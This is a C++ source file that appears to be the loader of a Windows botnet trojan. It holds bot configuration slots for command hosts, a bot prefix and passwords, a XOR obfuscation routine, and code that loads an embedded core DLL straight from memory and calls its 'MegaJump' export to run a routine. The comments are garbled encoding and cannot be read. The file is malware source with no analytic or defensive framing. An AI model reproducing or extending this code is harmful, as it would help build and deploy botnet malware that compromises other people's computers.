#include <windows.h>

#pragma comment(linker, "/ENTRY:LoaderMain" )


#include "GetApi.h"
#include "Config.h"
#include "Crypt.h"
#include "DllLoader.h"

#include "CoreDllDef.h"




//--------------------------------------------
//  ������ ���������� �����
//--------------------------------------------
char SESSION_PASSWORD[MAX_SESSION_PASSW_SIZE + 1] = BOTPARAM_SESSION_PASSW;

//****************************************************************************
//  ������ ������.
//****************************************************************************
char BOT_MAINHOSTS_ARRAY[MAX_MAINHOSTS_BUF_SIZE] = BOTPARAM_MAINHOSTS;


//----------------------------------------------------------------------------
// �������� ������� (� �������). ��������� ��������
//----------------------------------------------------------------------------
char Delay[MAX_DELAY_SIZE + 1]  = BOTPARAM_DELAY;

//----------------------------------------------------------------------------
// ������� ����
//----------------------------------------------------------------------------
char BOT_PREFIX[MAX_PREFIX_SIZE + 1] = BOTPARAM_PREFIX;

//----------------------------------------------------------------------------
// �������� ������ ����. ���� ������ ����� ����������� ���� �������
//----------------------------------------------------------------------------
char MainPassword[MAX_PASSWORD_SIZE + 1] = BOTPARAM_MAINPASSWORD;




//  ���������� DLL ����
namespace CoreDll
{
	#include "CoreDllData.cpp"		
}


DWORD XORCrypt::Crypt(PCHAR Password, LPBYTE Buffer, DWORD Size)
{
	DWORD a, b;
    a = 0;
	while (a < Size)
    {
		b = 0;
		while (Password[b])
		{
			Buffer[a] ^= (Password[b] + (a * b));
			b++;
		}
		a++;
    }

	return a;
}


//------------------------------------------------------------------------
// GetSessionPassword - ������� ���������� ��������� �� ������ ���
//                      ���������� ���������� ������
//------------------------------------------------------------------------
PCHAR GetSessionPassword()
{
	return SESSION_PASSWORD;
}


//---------------------------------------------------------------------
//  ������� �������� �������
//---------------------------------------------------------------------
DWORD WINAPI LoaderRoutine(LPVOID)
{
	InitializeAPI();


	while (true)
	{
		pOutputDebugStringA("Loader ��������");
		pSleep(1000);
	}  


	return 0;
}

//---------------------------------------------------------------------
//  �������� ������� txe  
//---------------------------------------------------------------------
int APIENTRY LoaderMain() 
{
	InitializeAPI();

	pMessageBoxA(0, "Start", 0, 0);

	TMegaJump MegaJump = NULL;

	TMemoryDLL DLL(CoreDll::data);
	DLL.GetProcAddress(COREDLL_MEGAJUMP, (LPVOID&)MegaJump);

	if (!MegaJump)
		pMessageBoxA(0, "������� MegaJump �����������", 0, 0);
	else
	{
		BOOL Result = MegaJump(LoaderRoutine);
		string F;
		F.Format("������ ������� ����������. Result=%d", Result);
		pMessageBoxA(0, F.t_str(), 0, 0);
	}




	pExitProcess(1);
	return 1;
}